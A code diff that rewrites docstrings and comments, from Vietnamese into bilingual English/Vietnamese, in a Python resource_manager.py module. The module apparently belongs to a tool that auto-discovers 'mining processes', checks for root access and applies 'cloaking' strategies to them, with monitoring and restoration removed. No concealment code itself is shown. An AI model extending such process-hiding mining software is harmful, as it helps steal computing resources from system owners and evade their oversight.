@@ -1,10 +1,10 @@
 """
-Module resource_manager.py - Quản lý tài nguyên (CPU, GPU, Network...) theo mô hình đồng bộ (threading).
-Sau khi refactor, module này:
-- BỎ toàn bộ cơ chế giám sát (nhiệt độ, công suất) & watchers.
-- BỎ cơ chế restore hoàn toàn.
-- Khi start, tự động khám phá tiến trình và CLOAK luôn.
-- Chỉ hỗ trợ cloaking, không có restoration.
+**Module** (mô-đun hệ thống – quản lý tài nguyên tính toán) resource_manager.py - **Resource Management** (quản lý tài nguyên – CPU, GPU, Network theo mô hình đồng bộ threading).
+**Post-refactor functionality** (chức năng sau tái cấu trúc):
+- **Monitoring removal** (loại bỏ giám sát – nhiệt độ, công suất & watchers)
+- **Complete restoration removal** (loại bỏ hoàn toàn khôi phục)
+- **Auto-discovery** (tự động khám phá – tiến trình và CLOAK ngay lập tức khi start)
+- **Cloaking-only support** (chỉ hỗ trợ che giấu – không có restoration)
 """
 
 import logging
@@ -18,7 +18,7 @@ from threading import RLock
 from typing import List, Any, Dict, Optional
 from itertools import count
 
-# Các import liên quan đến dự án
+# **Project-related imports** (import liên quan đến dự án – modules và dependencies của hệ thống)
 from .utils import MiningProcess
 from .resource_control import ResourceControlFactory, CPUResourceManager, CloakStrategyFactory
 from .auxiliary_modules.interfaces import IResourceManager
@@ -28,15 +28,15 @@ from .privileged_operations import get_privileged_manager
 from .unified_logging import get_unified_logger
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
-# ✅ INTELLIGENT CACHING: Use advanced strategy cache system
+# ✅ **INTELLIGENT CACHING** (bộ nhớ đệm thông minh – sử dụng hệ thống cache chiến lược nâng cao)
 from .strategy_cache import get_strategy_cache, CacheEvictionPolicy
 
 class SharedResourceManager:
     """
-    Lớp quản lý tài nguyên chung (VD: GPU, CPU).
-    - Khởi tạo/tắt NVML
-    - Đọc GPU usage, cache usage
-    - Áp dụng CloakStrategy cho tiến trình
+    **Shared Resource Manager** (quản lý tài nguyên dùng chung – GPU, CPU và tài nguyên hệ thống).
+    - **NVML initialization/shutdown** (khởi tạo/tắt NVML – thư viện quản lý GPU NVIDIA)
+    - **GPU usage monitoring** (giám sát sử dụng GPU – đọc GPU usage, cache usage)
+    - **CloakStrategy application** (áp dụng chiến lược che giấu – cho tiến trình khai thác)
     """
 
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
@@ -58,7 +58,7 @@ class SharedResourceManager:
         # Khởi tạo PrivilegedOperationManager (singleton)
         self.privileged_manager = get_privileged_manager(logger)
         
-        # Kiểm tra security context
+        # **[Check security context]** (kiểm tra ngữ cảnh bảo mật – xác nhận quyền và người dùng)
         security_context = self.privileged_manager.validate_security_context()
         self.logger.info(f"🔐 [Security Context] (ngữ cảnh bảo mật – người dùng/quyền root): User={security_context['user']}, Root={security_context['is_root']}")
 
